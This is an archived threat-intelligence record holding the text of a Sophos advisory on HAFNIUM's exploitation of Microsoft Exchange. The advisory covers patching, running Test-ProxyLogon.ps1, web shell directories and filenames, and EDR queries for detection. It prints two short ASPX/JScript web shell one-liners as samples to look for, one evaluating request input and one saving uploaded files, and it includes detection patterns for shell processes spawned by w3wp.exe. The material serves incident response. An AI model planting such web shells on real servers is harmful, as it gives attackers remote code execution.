{
    "id": "db9a108d-0a94-42ae-808b-3a603f14afa1",
    "created_at": "2023-01-12T15:09:58.106781Z",
    "updated_at": "2025-03-27T02:12:03.910372Z",
    "deleted_at": null,
    "sha1_hash": "a75b4f7ab58ce78b65c9f4ac2665a43ad126612a",
    "title": "2021-03-05 - HAFNIUM- Advice about the new nation-state attack",
    "authors": "",
    "file_creation_date": "2022-05-28T16:15:30Z",
    "file_modification_date": "2022-05-28T16:15:30Z",
    "file_size": 1317719,
    "plain_text": "# HAFNIUM: Advice about the new nation-state attack\n\n**[news.sophos.com/en-us/2021/03/05/hafnium-advice-about-the-new-nation-state-attack/](https://news.sophos.com/en-us/2021/03/05/hafnium-advice-about-the-new-nation-state-attack/)**\n\nMarch 5, 2021\n\n_Update: Microsoft released new security updates for Exchange Server on April 13th (CVE-_\n_2021-28480,_ _[28481,](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-28481)_ _[28482, and](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-28482)_ _[28483). The updates address bugs reported to Microsoft by](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-28483)_\n_the NSA and are considered urgent fixes that should be addressed immediately._\n\n[On March 2nd, zero-day vulnerabilities affecting Microsoft Exchange were publicly disclosed.](https://blogs.microsoft.com/on-the-issues/2021/03/02/new-nation-state-cyberattacks/)\nThese vulnerabilities are being actively exploited in the wild by HAFNIUM, a threat actor\nbelieved to be a nation state.\n\n## What is HAFNIUM?\n\nAccording to a [CISA alert:](https://us-cert.cisa.gov/ncas/current-activity/2021/03/02/microsoft-releases-out-band-security-updates-exchange-server)\n\n\n-----\n\nMicrosoft has released out-of-band security updates to address vulnerabilities affecting\nMicrosoft Exchange Server 2013, 2016, and 2019. A remote attacker can exploit three\nremote code execution vulnerabilities—CVE-2021-26857, CVE-2021-26858, and CVE2021-27065—to take control of an affected system and can exploit one vulnerability—\nCVE-2021-26855—to obtain access to sensitive information. These vulnerabilities\n**are being actively exploited in the wild.**\n\n[CISA also issued an emergency directive urging organizations to patch on-premises](https://us-cert.cisa.gov/ncas/current-activity/2021/03/03/cisa-issues-emergency-directive-and-alert-microsoft-exchange)\n**Exchange Servers and search their networks for indicators of attack.**\n\nFor an overview of HAFNIUM, and advice on how you should respond, watch this short video\nfrom Mat Gangwer, the head of the Sophos Managed Threat Response (MTR) team.\n\nFor a deep dive into HAFNIUM and the steps you can take to address the threat, watch our\nrecent webinar session:\n\n**For details of the Sophos protections against the exploitation of these vulnerabilities,**\n**click** **[here.](https://news.sophos.com/en-us/2021/03/08/protecting-sophos-customers-from-hafnium/)**\n\nUPDATE: Other threat actors are now taking advantage of the persistence established by\nHafnium to conduct a range of attacks. One actor is installing a new ransomware variant\n[called DearCry.](https://news.sophos.com/en-us/tag/dearcry/)\n\nIt is important to note that patching only protects your organization from being exploited by\nthe vulnerabilities going forward. It does NOT ensure that an adversary has not already\nexploited the vulnerabilities.\n\n## What should you do?\n\n### 1. Patch or disable\n\nPatch all on-premise Microsoft Exchanged servers in your environment with the relevant\nsecurity update. Details can be found on Microsoft’s [Exchange Team blog.](https://techcommunity.microsoft.com/t5/exchange-team-blog/released-march-2021-exchange-server-security-updates/ba-p/2175901)\n\nIf you are unable to patch, implement an IIS Re-Write Rule and disable Unified Messaging\n(UM), Exchange Control Panel (ECP) VDir, and Offline Address Book (OAB) VDir Services.\nDetails can be found in the Microsoft’s [Security Response Center blog.](https://msrc-blog.microsoft.com/2021/03/05/microsoft-exchange-server-vulnerabilities-mitigations-march-2021/)\n\nSophos recommends you backup Exchange IIS/Server logs before patching and updating.\n\n### 2. Determine possible exposure\n\n\n-----\n\n[Download and run the Test-ProxyLogon.ps1 script provided by the Microsoft Customer](https://github.com/microsoft/CSS-Exchange/tree/main/Security)\nSupport Services team to determine possible exposure. Details on interpreting the results of\n[this script can be found in this Microsoft article, a few paragraphs into the “Have I been](https://msrc-blog.microsoft.com/2021/03/16/guidance-for-responders-investigating-and-remediating-on-premises-exchange-server-vulnerabilities/#Have_I_been_compromised)\ncompromised?” section).\n\nIt is important to note that even with the patches installed, this will not address the presence\nof any malicious web shells. It is for this reason we recommend the use of Microsoft’s script\nto identify affected servers and look for the presence of web shells.\n\nTest-ProxyLogon.ps1 can output multiple .csv files per Exchange server, depending on what\nit finds. These .csv files can be viewed in a text editor or spreadsheet application.\n\nThe script will look for evidence of each vulnerability being abused, creating a .csv per CVE.\nIt will also look for suspicious files (which may be web shells) which should be reviewed, and\ncalculate how many days back in the logs it can identify potential abuse of the vulnerabilities.\n\nOur most common observations are related to output for CVE-2021-26855.\n\nHosts that may have been exploited by CVE-2021-26855 will be listed in the file\n\n[HOSTNAME]-Cve-2021-26855.csv\n\nThe “ClientIpAddress” column will list the source IP addresses of potential attackers.\n\nThe “AnchorMailbox” column will list a path to various applications running on Exchange that\nmay have been targeted. To reveal what actions may have been taken by the attacker, you\nwill need to extract the relevant application from AnchorMailbox.\ne.g. for “ServerInfo~a]@[REDACTED]:444/autodiscover/autodiscover.xml?#” the relevant\napplication is /autodiscover/\n\nTo determine what actions were taken by the adversary, you will need to look at the logs in\n%PROGRAMFILES%\\Microsoft\\Exchange Server\\V15\\Logging\\{application}\ne.g. %PROGRAMFILES%\\Microsoft\\Exchange Server\\V15\\Logging\\autodiscover\\\n\nThe “DateTime” column in [HOSTNAME]-Cve-2021-26855.csv will provide you with a\ntimestamp when the potential exploitation took place, to use when referencing the log files.\n\n### 3. Look for web shells or other suspicious .aspx files.\n\nWeb shells have been observed in the following directories:\n\n\n-----\n\n<volume>\\inetpub\\wwwroot\\aspnet_client\\\n\ne.g. C:\\inetpub\\wwwroot\\aspnet_client\\\n<volume>\\inetpub\\wwwroot\\aspnet_client\\system_web\\\n<exchange install path>\\FrontEnd\\HttpProxy\\owa\\auth\\\n\ne.g. C:\\Program Files\\Microsoft\\Exchange\nServer\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\\n<exchange install path>\\FrontEnd\\HttpProxy\\owa\\auth\\Current\\\n<exchange install path>\\FrontEnd\\HttpProxy\\owa\\auth\\<folder with version\nnumber>\\\n\nCommon names for these web shells include:\n\n(8 random letters and numbers)\n\nRegex: [0-9a-zA-Z]{8}.aspx\naspnet_client.aspx\naspnet_iisstart.aspx\naspnet_www.aspx\naspnettest.aspx\ndiscover.aspx\ndocument.aspx\nerror.aspx\nerrorcheck.aspx\nerrorEE.aspx\nerrorEEE.aspx\nerrorEW.aspx\nerrorFF.aspx\nhealthcheck.aspx\nhelp.aspx\nHttpProxy.aspx\nLogout.aspx\nMultiUp.aspx\none.aspx\nOutlookEN.aspx\nOutlookJP.aspx\nOutlookRU.aspx\nRedirSuiteServerProxy.aspx\nshell.aspx\nshellex.aspx\nsupp0rt.aspx\nsystem_web.aspx\nt.aspx\nTimeoutLogout.aspx\nweb.aspx\n\n\n-----\n\nweb.aspx\nxx.aspx\n\n### 4. Query with Sophos EDR\n\nIf you are using Sophos EDR, you can leverage the following example queries to identify\npotential web shells to investigate, check patch level of your servers, and look for suspicious\ncommands from child processes of w3wp.exe (a Microsoft’s IIS web server worker process,\nused by Exchange).\n```\n/* Query for known web shell names */\nSELECT\ndatetime(btime,'unixepoch') AS created_time,\nfilename,\ndirectory,\nsize AS fileSize,\ndatetime(atime, 'unixepoch') AS access_time,\ndatetime(mtime, 'unixepoch') AS modified_time\nFROM file\nWHERE\n(path LIKE 'C:\\inetpub\\wwwroot\\aspnet_client\\%' OR path LIKE\n'C:\\inetpub\\wwwroot\\aspnet_client\\system_web\\%' OR path LIKE 'C:\\Program\nFiles\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\%')\nAND filename IN\n('web.aspx','help.aspx','document.aspx','errorEE.aspx','errorEEE.aspx','errorEW.aspx',\n/* Query for web shells with randomized 8 character names */\nSELECT\ndatetime(btime,'unixepoch') AS created_time,\nregex_match(filename, '[0-9a-zA-Z]{8}.aspx', 0) AS filename,\ndirectory,\nsize AS fileSize,\ndatetime(atime, 'unixepoch') AS access_time,\ndatetime(mtime, 'unixepoch') AS modified_time\nFROM file\nWHERE (path LIKE 'C:\\inetpub\\wwwroot\\aspnet_client\\%' OR path LIKE\n'C:\\inetpub\\wwwroot\\aspnet_client\\system_web\\%' OR path LIKE 'C:\\Program\nFiles\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\%');\n\n```\nWhen reviewing the potential web shells identified by the queries, the web shell will typically\nappear inside an Exchange Offline Address Book (OAB) configuration file, in the ExternalUrl\nfield. E.g.\n```\nExternalUrl : http://f/<script language=\"JScript\" runat=\"server\">function Page_Load()\n{eval(Request[\"key-here\"],\"unsafe\");}</script>\nExternalUrl: http://g/<script Language=\"c#\" runat=\"server\">void Page_Load(object\nsender, EventArgs e){if (Request.Files.Count!=0) {\nRequest.Files[0].SaveAs(Server.MapPath(\"error.aspx\"));}}</script>\n\n```\n\n-----\n\n### 5. Establish impact\n\nReview process activity and command executions from the time the web shell was created,\nonwards. Investigate w3wp.exe (the IIS web server worker process) activity and any\ninstances of csc.exe (C# compiler) running as a child process. This should gleam trailheads\nto establish impact. The following Sophos EDR Live Discover query will aid you indentifying\nactivity of this nature.\n\n\n-----\n\n```\n/ MULTI Query for patch level, web shells, and suspicious commands /\nSELECT '----------------------' Test, '----------------------' Result, '---------------------' Evidence UNION ALL\n-- Check the version of Exchange that is running, to determine if it's patched\nSELECT DISTINCT\n  'Check Exchange Version to confirm Patch' Test,\n  CASE product_version \n   WHEN '15.0.1497.12' THEN 'Patched'\n   WHEN '15.1.2106.13' THEN 'Patched'\n   WHEN '15.1.2176.9' THEN 'Patched'\n   WHEN '15.1.2242.4' THEN 'Patched'\n   WHEN '15.2.721.13' THEN 'Patched'\n   WHEN '15.2.792.10' THEN 'Patched'\n   WHEN '15.2.858.5' THEN 'Patched'\n   ELSE 'NOT PATCHED'\n  END Result,\n  'Product_Version: ' || Product_version Evidence\nFROM file \nWHERE path = ( (SELECT data FROM registry \n        WHERE key =\n'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\ExchangeServer\\v15\\Setup' AND path =\n'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\ExchangeServer\\v15\\Setup\\MsiInstallPath'\n        )||'bin\\Microsoft.Exchange.RpcClientAccess.Service.exe')UNION ALL\n-- Identify common webshells which which may exist. Files with creation dates after\nFeb 28, 2021 should be reviewed.\nSELECT DISTINCT\n  'List of Suspect Web Shell files (if any).' TEST,\n  CAST(GROUP_CONCAT(filename || CHAR(10)) AS TEXT) Result,\n  CAST(GROUP_CONCAT('PATH: ' || path || CHAR(10) || 'CREATED ON: ' ||\nDATETIME(btime,'unixepoch') || CHAR(10)) AS TEXT) Evidence\nFROM file\nWHERE (path LIKE 'C:\\inetpub\\wwwroot\\aspnet_client\\%' OR path LIKE\n'C:\\inetpub\\wwwroot\\aspnet_client\\system_web\\%' OR \n    path LIKE 'C:\\Program Files\\Microsoft\\Exchange\nServer\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\%') AND \n   (filename IN\n('web.aspx','help.aspx','document.aspx','errorEE.aspx','errorEEE.aspx','errorEW.aspx',\n'healthcheck.aspx','aspnet_www.aspx','aspnet_client.aspx','xx.aspx','shell.aspx','aspn\n'errorcheck.aspx','t.aspx','discover.aspx','aspnettest.aspx','error.aspx','RedirSuiteS\n'supp0rt.aspx','HttpProxy.aspx','system_web.aspx','OutlookEN.aspx','TimeoutLogout.aspx\n          'OutlookJP.aspx','MultiUp.aspx','OutlookRU.aspx') OR\n    (LENGTH(filename) = 13) )UNION ALL\n-- Identify the common pattern for commands being executed from a webshell. This is\nlooking over the last (15 days), but can be adjusted.\nSELECT DISTINCT\n  'Suspicious Commands Detected as Child Process' TEST,\n  'Found a Suspicious Command Which Could Have Spawned from a Web Shell' Result,\n  DateTime(time, 'unixepoch') || ',' ||sophosPID || ',' || processname || ',' ||\n\n```\n\n-----\n\n```\ncmdline Evidence\nFROM sophos_process_journal spj WHERE LOWER(spj.processname) IN\n('cmd.exe','powershell.exe', 'csc.exe') AND time > strftime('%s','now','-15 days')\nAND \n  (SELECT LOWER(processname) FROM sophos_process_journal spj2 WHERE spj2.sophosPID =\nspj.parentSophosPID) IN ('w3wp.exe', 'umworkerprocess.exe')\n\n## How Sophos Managed Threat Response (MTR) can help\n\n```\nThreat such as HAFNIUM are a great example of the peace of mind you get knowing your\norganization is backed by an elite team of threat hunters and response experts.\n\n[When the HAFNIUM news broke, the Sophos MTR team immediately began to hunt and](https://www.sophos.com/en-us/products/managed-threat-response.aspx)\ninvestigate in customer environments to determine if there was any activity related to the\nattack. Additionally, they also looked to uncover any new artifacts or IoCs related to the\nattack that could provide further protection for all Sophos customers.\n\nThe 24/7 nature of Sophos MTR meant that not a single second was wasted before the team\ngot to work, ensuring our customers were protected.\n\nSophosLabs has also published detections related to the known activity and IOCs related to\nthe Exchange vulnerability. This is in addition to previous protections already in place to\ndetect post-exploit activity.\n\n[Concerned about HAFNIUM? Contact Sophos MTR today to ensure that any potential](https://secure2.sophos.com/en-us/products/managed-threat-response/contact-request.aspx)\nadversarial activity in your environment is identified and neutralized.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-03-05 - HAFNIUM- Advice about the new nation-state attack.pdf"
    ],
    "report_names": [
        "2021-03-05 - HAFNIUM- Advice about the new nation-state attack.pdf"
    ],
    "threat_actors": [
        {
            "id": "529c1ae9-4579-4245-86a6-20f4563a695d",
            "created_at": "2022-10-25T16:07:23.702006Z",
            "updated_at": "2025-03-27T02:02:09.93109Z",
            "deleted_at": null,
            "main_name": "Hafnium",
            "aliases": [
                "Red Dev 13",
                "Silk Typhoon"
            ],
            "source_name": "ETDA:Hafnium",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "7c969685-459b-4c93-a788-74108eab6f47",
            "created_at": "2023-01-06T13:46:39.189751Z",
            "updated_at": "2025-03-27T02:00:03.017103Z",
            "deleted_at": null,
            "main_name": "HAFNIUM",
            "aliases": [
                "ATK233",
                "G0125",
                "Operation Exchange Marauder",
                "Red Dev 13",
                "Silk Typhoon"
            ],
            "source_name": "MISPGALAXY:HAFNIUM",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "2704d770-43b4-4bc4-8a5a-05df87416848",
            "created_at": "2022-10-25T15:50:23.306305Z",
            "updated_at": "2025-03-27T02:00:55.43633Z",
            "deleted_at": null,
            "main_name": "HAFNIUM",
            "aliases": [
                "HAFNIUM",
                "Operation Exchange Marauder",
                "Silk Typhoon"
            ],
            "source_name": "MITRE:HAFNIUM",
            "tools": [
                "Tarrask",
                "ASPXSpy",
                "Impacket",
                "PsExec",
                "China Chopper"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673536198,
    "ts_updated_at": 1743041523,
    "ts_creation_date": 1653754530,
    "ts_modification_date": 1653754530,
    "files": {
        "pdf": "https://archive.orkl.eu/a75b4f7ab58ce78b65c9f4ac2665a43ad126612a.pdf",
        "text": "https://archive.orkl.eu/a75b4f7ab58ce78b65c9f4ac2665a43ad126612a.txt",
        "img": "https://archive.orkl.eu/a75b4f7ab58ce78b65c9f4ac2665a43ad126612a.jpg"
    }
}